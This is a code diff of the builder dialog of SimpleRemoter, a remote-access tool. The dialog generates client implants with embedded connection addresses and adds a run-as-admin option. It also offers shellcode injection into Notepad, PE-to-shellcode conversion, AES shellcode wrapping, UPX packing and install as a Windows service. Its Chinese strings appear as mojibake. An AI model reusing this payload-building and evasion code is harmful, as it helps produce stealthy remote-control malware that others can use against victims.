@@ -1,4 +1,4 @@
-// BuildDlg.cpp : ÊµÏÖÎÄ¼ş
+ï»¿// BuildDlg.cpp : å®ç°æ–‡ä»¶
 //
 
 #include "stdafx.h"
@@ -23,7 +23,7 @@ enum Index {
     OTHER_ITEM
 };
 
-// CBuildDlg ¶Ô»°¿ò
+// CBuildDlg å¯¹è¯æ¡†
 
 IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)
 
@@ -41,15 +41,15 @@ LPBYTE ReadResource(int resourceId, DWORD &dwSize)
     if (hResource == NULL) {
         return NULL;
     }
-    // »ñÈ¡×ÊÔ´µÄ´óĞ¡
+    // è·å–èµ„æºçš„å¤§å°
     dwSize = SizeofResource(NULL, hResource);
 
-    // ¼ÓÔØ×ÊÔ´
+    // åŠ è½½èµ„æº
     HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
     if (hLoadedResource == NULL) {
         return NULL;
     }
-    // Ëø¶¨×ÊÔ´²¢»ñÈ¡Ö¸Ïò×ÊÔ´Êı¾İµÄÖ¸Õë
+    // é”å®šèµ„æºå¹¶è·å–æŒ‡å‘èµ„æºæ•°æ®çš„æŒ‡é’ˆ
     LPVOID pData = LockResource(hLoadedResource);
     if (pData == NULL) {
         return NULL;
@@ -67,7 +67,7 @@ CBuildDlg::CBuildDlg(CWnd* pParent)
     , m_strPort(_T(""))
     , m_strFindden(FLAG_FINDEN)
     , m_sGroupName(_T("default"))
-    , m_strEncryptIP(_T("ÊÇ"))
+    , m_strEncryptIP(_T("æ˜¯"))
 {
 
 }
@@ -100,10 +100,11 @@ BEGIN_MESSAGE_MAP(CBuildDlg, CDialog)
     ON_COMMAND(ID_HELP_PARAMETERS, &CBuildDlg::OnHelpParameters)
     ON_COMMAND(ID_HELP_FINDDEN, &CBuildDlg::OnHelpFindden)
     ON_COMMAND(ID_MENU_ENCRYPT_IP, &CBuildDlg::OnMenuEncryptIp)
+    ON_COMMAND(ID_CLIENT_RUNAS_ADMIN, &CBuildDlg::OnClientRunasAdmin)
 END_MESSAGE_MAP()
 
 
-// CBuildDlg ÏûÏ¢´¦Àí³ÌĞò
+// CBuildDlg æ¶ˆæ¯å¤„ç†ç¨‹åº
 
 std::string ReleaseUPX();
 void run_upx_async(HWND hwnd, const std::string& upx, const std::string& file, bool isCompress);
@@ -173,7 +174,7 @@ void CBuildDlg::OnBnClickedOk()
     int index = m_ComboExe.GetCurSel(), typ=index;
     int is64bit = m_ComboBits.GetCurSel() == 0;
     if (index == IndexTestRun_InjSC && !is64bit) {
-        MessageBox("Shellcode Ö»ÄÜÏò64Î»¼ÇÊÂ±¾×¢Èë£¬×¢ÈëÆ÷Ò²Ö»ÄÜÊÇ64Î»!", "ÌáÊ¾", MB_ICONWARNING);
+        MessageBox("Shellcode åªèƒ½å‘64ä½è®°äº‹æœ¬æ³¨å…¥ï¼Œæ³¨å…¥å™¨ä¹Ÿåªèƒ½æ˜¯64ä½!", "æç¤º", MB_ICONWARNING);
         return;
     }
     int startup = Startup_DLL;
@@ -219,7 +220,7 @@ void CBuildDlg::OnBnClickedOk()
     case OTHER_ITEM: {
         m_OtherItem.GetWindowTextA(file);
         typ = -1;
-        if (file != "Î´Ñ¡ÔñÎÄ¼ş") {
+        if (file != "æœªé€‰æ‹©æ–‡ä»¶") {
             CFile File;
             File.Open(file, CFile::modeRead | CFile::typeBinary);
             dwFileSize = File.GetLength();
@@ -235,10 +236,10 @@ void CBuildDlg::OnBnClickedOk()
         break;
     }
     if (szBuffer == NULL) {
-        MessageBox("³öÏÖÄÚ²¿´íÎó£¬Çë¼ì²éÊäÈë£¬ÖØĞÂ±àÒë³ÌĞò!", "ÌáÊ¾", MB_ICONWARNING);
+        MessageBox("å‡ºç°å†…éƒ¨é”™è¯¯ï¼Œè¯·æ£€æŸ¥è¾“å…¥ï¼Œé‡æ–°ç¼–è¯‘ç¨‹åº!", "æç¤º", MB_ICONWARNING);
         return;
     }
-    //////////ÉÏÏßĞÅÏ¢//////////////////////
+    //////////ä¸Šçº¿ä¿¡æ¯//////////////////////
     CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "", typ, false, DLL_VERSION, 0, startup, HeaderEncV0 };
     if(m_strFindden.GetLength())
         memcpy(g_ConnectAddress.szFlag, m_strFindden.GetBuffer(), min(sizeof(g_ConnectAddress.szFlag), m_strFindden.GetLength()));
@@ -254,11 +255,13 @@ void CBuildDlg::OnBnClickedOk()
         SAFE_DELETE_ARRAY(szBuffer);
         return;
     }
-    bool encrypt = m_strEncryptIP == _T("ÊÇ");
+    bool encrypt = m_strEncryptIP == _T("æ˜¯");
     if (encrypt && startup != Startup_InjSC && index != IndexTinyRun)
         g_ConnectAddress.Encrypt();
+    if (m_runasAdmin)
+        g_ConnectAddress.runasAdmin = TRUE;
     try {
-        // ¸üĞÂ±êÊ¶
+        // æ›´æ–°æ ‡è¯†
         char* ptr = (char*)szBuffer, *end = (char*)szBuffer + dwFileSize;
         bool bFind = false;
         int bufSize = dwFileSize;
@@ -270,10 +273,10 @@ void CBuildDlg::OnBnClickedOk()
             CONNECT_ADDRESS* dst = (CONNECT_ADDRESS*)(ptr + iOffset);
             auto result = strlen(dst->szBuildDate) ? compareDates(dst->szBuildDate, g_ConnectAddress.szBuildDate) : -1;
             if (result > 0) {
-                MessageBox("¿Í»§¶Ë°æ±¾±ÈÖ÷¿Ø³ÌĞò¸ü¸ß, ÎŞ·¨Éú³É!\r\n" + file, "ÌáÊ¾", MB_ICONWARNING);
+                MessageBox("å®¢æˆ·ç«¯ç‰ˆæœ¬æ¯”ä¸»æ§ç¨‹åºæ›´é«˜, æ— æ³•ç”Ÿæˆ!\r\n" + file, "æç¤º", MB_ICONWARNING);
                 return;
             }
-            if (result != -2 && result <= 0) { // ¿Í»§¶Ë°æ±¾²»ÄÜ²»´óÓÚÖ÷¿Ø¶Ë
+            if (result != -2 && result <= 0) { // å®¢æˆ·ç«¯ç‰ˆæœ¬ä¸èƒ½ä¸å¤§äºä¸»æ§ç«¯
                 bFind = true;
                 auto master = GetMasterId();
                 memcpy(ptr + iOffset, &(g_ConnectAddress.ModifyFlag(master.c_str())), sizeof(g_ConnectAddress));
@@ -282,12 +285,12 @@ void CBuildDlg::OnBnClickedOk()
             bufSize -= iOffset + sizeof(g_ConnectAddress);
         }
         if (!bFind) {
-            MessageBox("³öÏÖÄÚ²¿´íÎó£¬Î´ÄÜÕÒµ½±êÊ¶ĞÅÏ¢!\r\n" + file, "ÌáÊ¾", MB_ICONWARNING);
+            MessageBox("å‡ºç°å†…éƒ¨é”™è¯¯ï¼Œæœªèƒ½æ‰¾åˆ°æ ‡è¯†ä¿¡æ¯!\r\n" + file, "æç¤º", MB_ICONWARNING);
             SAFE_DELETE_ARRAY(szBuffer);
             return;
         }
 
-        // ±£´æÎÄ¼ş
+        // ä¿å­˜æ–‡ä»¶
         char path[_MAX_PATH], * p = path;
         GetModuleFileNameA(NULL, path, sizeof(path));
         while (*p) ++p;
@@ -299,19 +302,19 @@ void CBuildDlg::OnBnClickedOk()
         CFile File;
         BOOL r=File.Open(strSeverFile,CFile::typeBinary|CFile::modeCreate|CFile::modeWrite);
         if (!r) {
-            MessageBox("·şÎñ³ÌĞò´´½¨Ê§°Ü!\r\n" + strSeverFile, "ÌáÊ¾", MB_ICONWARNING);
+            MessageBox("æœåŠ¡ç¨‹åºåˆ›å»ºå¤±è´¥!\r\n" + strSeverFile, "æç¤º", MB_ICONWARNING);
             SAFE_DELETE_ARRAY(szBuffer);
             return;
         }
         File.Write(szBuffer, dwFileSize);
         File.Close();
-        CString tip = index == IndexTestRun_DLL ? "\r\nÌáÊ¾: ÇëÉú³É\"ServerDll.dll\"£¬ÒÔ±ã³ÌĞòÕı³£ÔËĞĞ¡£" : "";
-        tip += g_ConnectAddress.protoType==PROTO_KCP ? "\nÌáÊ¾: Ê¹ÓÃKCPĞ­ÒéÉú³É·şÎñ£¬±ØĞëÉèÖÃÖ÷¿ØUDPĞ­Òé²ÎÊıÎª1¡£" : "";
+        CString tip = index == IndexTestRun_DLL ? "\r\næç¤º: è¯·ç”Ÿæˆ\"ServerDll.dll\"ï¼Œä»¥ä¾¿ç¨‹åºæ­£å¸¸è¿è¡Œã€‚" : "";
+        tip += g_ConnectAddress.protoType==PROTO_KCP ? "\næç¤º: ä½¿ç”¨KCPåè®®ç”ŸæˆæœåŠ¡ï¼Œå¿…é¡»è®¾ç½®ä¸»æ§UDPåè®®å‚æ•°ä¸º1ã€‚" : "";
         std::string upx;
         if(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_UPX) upx = ReleaseUPX();
         if (!upx.empty()) {
             run_upx_async(GetParent()->GetSafeHwnd(), upx, strSeverFile.GetString(), true);
-            MessageBox("ÕıÔÚUPXÑ¹Ëõ£¬Çë¹Ø×¢ĞÅÏ¢ÌáÊ¾¡£\r\nÎÄ¼şÎ»ÓÚ: " + strSeverFile + tip, "ÌáÊ¾", MB_ICONINFORMATION);
+            MessageBox("æ­£åœ¨UPXå‹ç¼©ï¼Œè¯·å…³æ³¨ä¿¡æ¯æç¤ºã€‚\r\næ–‡ä»¶ä½äº: " + strSeverFile + tip, "æç¤º", MB_ICONINFORMATION);
         } else {
             if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES) {
                 DWORD dwSize = 0;
@@ -348,25 +351,25 @@ void CBuildDlg::OnBnClickedOk()
             } else if (m_ComboCompress.GetCurSel() == CLIENT_PE_TO_SEHLLCODE) {
                 int pe_2_shellcode(const std::string & in_path, const std::string & out_str);
                 int ret = pe_2_shellcode(strSeverFile.GetString(), strSeverFile.GetString());
-                if (ret)MessageBox(CString("ShellCode ×ª»»Òì³£, Òì³£´úÂë: ") + CString(std::to_string(ret).c_str()),
-                                       "ÌáÊ¾", MB_ICONINFORMATION);
+                if (ret)MessageBox(CString("ShellCode è½¬æ¢å¼‚å¸¸, å¼‚å¸¸ä»£ç : ") + CString(std::to_string(ret).c_str()),
+                                       "æç¤º", MB_ICONINFORMATION);
             }
-            MessageBox("Éú³É³É¹¦! ÎÄ¼şÎ»ÓÚ:\r\n" + strSeverFile + tip, "ÌáÊ¾", MB_ICONINFORMATION);
+            MessageBox("ç”ŸæˆæˆåŠŸ! æ–‡ä»¶ä½äº:\r\n" + strSeverFile + tip, "æç¤º", MB_ICONINFORMATION);
         }
         SAFE_DELETE_ARRAY(szBuffer);
         if (index == IndexTestRun_DLL) return;
     } catch (CMemoryException* e) {
         char err[100];
         e->GetErrorMessage(err, sizeof(err));
-        MessageBox("ÄÚ´æÒì³£:" + CString(err), "Òì³£", MB_ICONERROR);
+        MessageBox("å†…å­˜å¼‚å¸¸:" + CString(err), "å¼‚å¸¸", MB_ICONERROR);
     } catch (CFileException* e) {
         char err[100];
         e->GetErrorMessage(err, sizeof(err));
-        MessageBox("ÎÄ¼şÒì³£:" + CString(err), "Òì³£", MB_ICONERROR);
+        MessageBox("æ–‡ä»¶å¼‚å¸¸:" + CString(err), "å¼‚å¸¸", MB_ICONERROR);
     } catch (CException* e) {
         char err[100];
         e->GetErrorMessage(err, sizeof(err));
-        MessageBox("ÆäËûÒì³£:" + CString(err), "Òì³£", MB_ICONERROR);
+        MessageBox("å…¶ä»–å¼‚å¸¸:" + CString(err), "å¼‚å¸¸", MB_ICONERROR);
     }
 
     SAFE_DELETE_ARRAY(szBuffer);
@@ -377,33 +380,33 @@ BOOL CBuildDlg::OnInitDialog()
 {
     CDialog::OnInitDialog();
 
-    // TODO:  ÔÚ´ËÌí¼Ó¶îÍâµÄ³õÊ¼»¯
+    // TODO:  åœ¨æ­¤æ·»åŠ é¢å¤–çš„åˆå§‹åŒ–
     CEdit* pEdit = (CEdit*)GetDlgItem(IDC_EDIT_IP);
     pEdit->LimitText(99);
-    m_ComboExe.InsertString(IndexTestRun_DLL, "TestRun - ´ÅÅÌDLL");
-    m_ComboExe.InsertString(IndexTestRun_MemDLL, "TestRun - ÄÚ´æDLL");
-    m_ComboExe.InsertString(IndexTestRun_InjSC, "TestRun - ×¢Èë¼ÇÊÂ±¾");
+    m_ComboExe.InsertString(IndexTestRun_DLL, "TestRun - ç£ç›˜DLL");
+    m_ComboExe.InsertString(IndexTestRun_MemDLL, "TestRun - å†…å­˜DLL");
+    m_ComboExe.InsertString(IndexTestRun_InjSC, "TestRun - æ³¨å…¥è®°äº‹æœ¬");
 
     m_ComboExe.InsertString(IndexGhost, "ghost.exe");
     m_ComboExe.InsertString(IndexServerDll, "ServerDll.dll");
     m_ComboExe.InsertString(IndexTinyRun, "TinyRun.dll");
-    m_ComboExe.InsertString(IndexGhostMsc, "ghost.exe - Windows ·şÎñ");
-    m_ComboExe.InsertString(IndexTestRunMsc, "TestRun - Windows ·şÎñ");
-    m_ComboExe.InsertString(OTHER_ITEM, CString("Ñ¡ÔñÎÄ¼ş"));
+    m_ComboExe.InsertString(IndexGhostMsc, "ghost.exe - Windows æœåŠ¡");
+    m_ComboExe.InsertString(IndexTestRunMsc, "TestRun - Windows æœåŠ¡");
+    m_ComboExe.InsertString(OTHER_ITEM, CString("é€‰æ‹©æ–‡ä»¶"));
     m_ComboExe.SetCurSel(IndexTestRun_MemDLL);
 
-    m_ComboBits.InsertString(0, "64Î»");
-    m_ComboBits.InsertString(1, "32Î»");
+    m_ComboBits.InsertString(0, "64ä½");
+    m_ComboBits.InsertString(1, "32ä½");
     m_ComboBits.SetCurSel(0);
 
-    m_ComboRunType.InsertString(RUNNING_RANDOM, "Ëæ»úÉÏÏß");
-    m_ComboRunType.InsertString(RUNNING_PARALLEL, "²¢·¢ÉÏÏß");
+    m_ComboRunType.InsertString(RUNNING_RANDOM, "éšæœºä¸Šçº¿");
+    m_ComboRunType.InsertString(RUNNING_PARALLEL, "å¹¶å‘ä¸Šçº¿");
     m_ComboRunType.SetCurSel(RUNNING_RANDOM);
 
     m_ComboProto.InsertString(PROTO_TCP, "TCP");
     m_ComboProto.InsertString(PROTO_UDP, "UDP");
     m_ComboProto.InsertString(PROTO_HTTP, "HTTP");
-    m_ComboProto.InsertString(PROTO_RANDOM, "Ëæ»ú");
+    m_ComboProto.InsertString(PROTO_RANDOM, "éšæœº");
     m_ComboProto.InsertString(PROTO_KCP, "KCP");
     m_ComboProto.SetCurSel(PROTO_TCP);
 
@@ -411,7 +414,7 @@ BOOL CBuildDlg::OnInitDialog()
     m_ComboEncrypt.InsertString(PROTOCOL_HELL, "HELL");
     m_ComboEncrypt.SetCurSel(PROTOCOL_SHINE);
 
-    m_ComboCompress.InsertString(CLIENT_COMPRESS_NONE, "ÎŞ");
+    m_ComboCompress.InsertString(CLIENT_COMPRESS_NONE, "æ— ");
     m_ComboCompress.InsertString(CLIENT_COMPRESS_UPX, "UPX");
     m_ComboCompress.InsertString(CLIENT_COMPRESS_SC_AES, "ShellCode AES");
     m_ComboCompress.InsertString(CLIENT_PE_TO_SEHLLCODE, "PE->ShellCode");
@@ -419,8 +422,16 @@ BOOL CBuildDlg::OnInitDialog()
 
     m_OtherItem.ShowWindow(SW_HIDE);
 
+    m_runasAdmin = FALSE;
+	m_MainMenu.LoadMenuA(IDR_MENU_BUILD);
+	CMenu* SubMenu = m_MainMenu.GetSubMenu(0);
+    SubMenu->CheckMenuItem(ID_MENU_ENCRYPT_IP, MF_CHECKED);
+    SubMenu->CheckMenuItem(ID_CLIENT_RUNAS_ADMIN, MF_UNCHECKED);
+	::SetMenu(this->GetSafeHwnd(), m_MainMenu.GetSafeHmenu()); // ä¸ºçª—å£è®¾ç½®èœå•
+	::DrawMenuBar(this->GetSafeHwnd());                        // æ˜¾ç¤ºèœå•
+
     return TRUE;  // return TRUE unless you set the focus to a control
-    // Òì³£: OCX ÊôĞÔÒ³Ó¦·µ»Ø FALSE
+    // å¼‚å¸¸: OCX å±æ€§é¡µåº”è¿”å› FALSE
 }
 
 void CBuildDlg::OnCbnSelchangeComboExe()
@@ -430,17 +441,17 @@ void CBuildDlg::OnCbnSelchangeComboExe()
         CComPtr<IShellFolder> spDesktop;
         HRESULT hr = SHGetDesktopFolder(&spDesktop);
         if (FAILED(hr)) {
-            MessageBox("Explorer Î´ÕıÈ·³õÊ¼»¯! ÇëÉÔºóÔÙÊÔ¡£", "ÌáÊ¾");
+            MessageBox("Explorer æœªæ­£ç¡®åˆå§‹åŒ–! è¯·ç¨åå†è¯•ã€‚", "æç¤º");
             return;
         }
-        // ¹ıÂËÆ÷£ºÏÔÊ¾ËùÓĞÎÄ¼şºÍÌØ¶¨ÀàĞÍÎÄ¼ş£¨ÀıÈçÎÄ±¾ÎÄ¼ş£©
+        // è¿‡æ»¤å™¨ï¼šæ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶å’Œç‰¹å®šç±»å‹æ–‡ä»¶ï¼ˆä¾‹å¦‚æ–‡æœ¬æ–‡ä»¶ï¼‰
         CFileDialog fileDlg(TRUE, _T("dll"), NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
                             _T("All Files (*.*)|*.*|DLL Files (*.dll)|*.dll|EXE Files (*.exe)|*.exe|"), AfxGetMainWnd());
         int ret = 0;
         try {
             ret = fileDlg.DoModal();
         } catch (...) {
-            MessageBox("ÎÄ¼ş¶Ô»°¿òÎ´³É¹¦´ò¿ª! ÇëÉÔºóÔÙÊÔ¡£", "ÌáÊ¾");
+            MessageBox("æ–‡ä»¶å¯¹è¯æ¡†æœªæˆåŠŸæ‰“å¼€! è¯·ç¨åå†è¯•ã€‚", "æç¤º");
             return;
         }
         if (ret == IDOK) {
@@ -460,7 +471,7 @@ void CBuildDlg::OnCbnSelchangeComboExe()
                 SAFE_DELETE_ARRAY(szBuffer);
             }
         } else {
-            m_OtherItem.SetWindowTextA("Î´Ñ¡ÔñÎÄ¼ş");
+            m_OtherItem.SetWindowTextA("æœªé€‰æ‹©æ–‡ä»¶");
         }
         m_OtherItem.ShowWindow(SW_SHOW);
     } else {
@@ -472,7 +483,7 @@ void CBuildDlg::OnCbnSelchangeComboExe()
 
 void CBuildDlg::OnHelpParameters()
 {
-    CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/wiki#Éú³É²ÎÊı");
+    CString url = _T("https://github.com/yuanyuanxiang/SimpleRemoter/wiki#ç”Ÿæˆå‚æ•°");
     ShellExecute(NULL, _T("open"), url, NULL, NULL, SW_SHOWNORMAL);
 }
 
@@ -481,7 +492,7 @@ void CBuildDlg::OnHelpFindden()
 {
     CInputDialog dlg(this);
     dlg.m_str = m_strFindden;
-    dlg.Init("Éú³É±êÊ¶", "ÇëÉèÖÃ±êÊ¶ĞÅÏ¢:");
+    dlg.Init("ç”Ÿæˆæ ‡è¯†", "è¯·è®¾ç½®æ ‡è¯†ä¿¡æ¯:");
     if (dlg.DoModal() == IDOK) {
         m_strFindden = dlg.m_str;
     }
@@ -490,13 +501,15 @@ void CBuildDlg::OnHelpFindden()
 
 void CBuildDlg::OnMenuEncryptIp()
 {
-    CInputDialog dlg(this);
-    dlg.m_str = m_strEncryptIP;
-    dlg.Init("¼ÓÃÜÔ¶³ÌµØÖ·", "ÇëÊäÈëÊÇ»òÕß·ñ:");
-    if (dlg.DoModal() == IDOK ) {
-        if (m_strEncryptIP != "ÊÇ" &&  m_strEncryptIP != "·ñ") {
-            MessageBoxA("ÇëÊäÈëÊÇ»òÕß·ñ!", "ÌáÊ¾", MB_ICONINFORMATION);
-        } else
-            m_strEncryptIP = dlg.m_str;
-    }
+    m_strEncryptIP = m_strEncryptIP == "æ˜¯" ? "å¦" : "æ˜¯";
+	CMenu* SubMenu = m_MainMenu.GetSubMenu(0);
+	SubMenu->CheckMenuItem(ID_MENU_ENCRYPT_IP, m_strEncryptIP == "æ˜¯" ? MF_CHECKED : MF_UNCHECKED);
+}
+
+
+void CBuildDlg::OnClientRunasAdmin()
+{
+    m_runasAdmin = !m_runasAdmin;
+	CMenu* SubMenu = m_MainMenu.GetSubMenu(0);
+	SubMenu->CheckMenuItem(ID_CLIENT_RUNAS_ADMIN, m_runasAdmin ? MF_CHECKED : MF_UNCHECKED);
 }
